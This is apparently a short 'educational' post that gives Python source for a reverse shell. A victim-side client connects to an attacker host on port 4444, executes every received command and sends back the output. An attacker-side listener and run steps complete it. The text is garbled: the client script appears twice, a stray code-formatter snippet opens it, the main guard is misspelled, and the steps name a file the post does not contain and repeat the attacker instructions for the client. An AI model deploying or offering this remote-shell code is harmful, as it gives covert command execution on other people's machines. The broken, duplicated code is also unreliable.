This is a simplified example for educational purposes only. In a real-world scenario, such tools are often much more complex and include various features for evading detection, encrypting communications, and more.
# Install black
pip install black

# Format code with black
black your_script.py
**Client.py (Victim's Machine)**
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", 4444))  # Replace "attacker_ip" with the attacker's IP address
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

def main():
    while True:
        try:
            connect()
        except:
            pass

if _name_ == "_main_":
    main()


**Client.py (Victim's Machine)**
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", 4444))  # Replace "attacker_ip" with the attacker's IP address
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

def main():
    while True:
        try:
            connect()
        except:
            pass

if _name_ == "_main_":
    main()
`
**[**Attacker.py**`]**
import socket

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))  # Bind to all available interfaces on port 4444
    s.listen(1)
    print("Waiting for connection...")
    conn, addr = s.accept()
    print(f"Connected to {addr}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if command.lower() == "exit":
            break
        output = conn.recv(4096).decode()
        print(output)
    conn.close()

if _name_ == "_main_":
    start_server()

**
**Steps for execution******
Set Up the Attacker's Machine:

Open a terminal or command prompt on the attacker's machine.
Save the Server.py script to a file, for example, server.py.
Run the server script:
sh

python server.py
*
*
The server will start listening for incoming connections on port 4444
**In client terminal**
Open a terminal or command prompt on the attacker's machine.
Save the Server.py script to a file, for example, server.py.
Run the server script:
sh

python server.py
The server will start listening for incoming connections on port 4444.


    
